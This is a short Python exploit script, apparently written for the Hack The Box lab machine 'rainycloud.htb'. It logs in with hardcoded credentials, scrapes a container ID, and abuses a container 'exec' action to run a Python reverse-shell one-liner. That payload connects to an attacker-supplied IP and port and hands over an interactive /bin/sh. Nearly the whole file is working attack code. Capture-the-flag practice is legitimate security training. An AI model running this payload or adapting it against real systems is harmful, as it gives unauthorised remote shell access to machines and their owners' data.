import requests
import re
import sys

# Request for login
session = requests.Session()
url = "http://rainycloud.htb/login"
data = {"username":"gary","password":"rubberducky"}
r = session.post(url=url,data=data)

# Request for grep containerID
r = session.get("http://rainycloud.htb/containers")
container_id = re.findall("[A-Fa-f0-9]{64}",r.text)

def reverse_shell(ip,port):
	command = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ ip +"\","+ port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"
	payload = "python3 -c \'" + command + "\'"
	return payload

# Request for Command execution
rce = reverse_shell(sys.argv[1],sys.argv[2])
data = {"action":"exec "+ rce,"id":container_id[0]}
r = session.post("http://rainycloud.htb/containers",data=data)
print(r.text)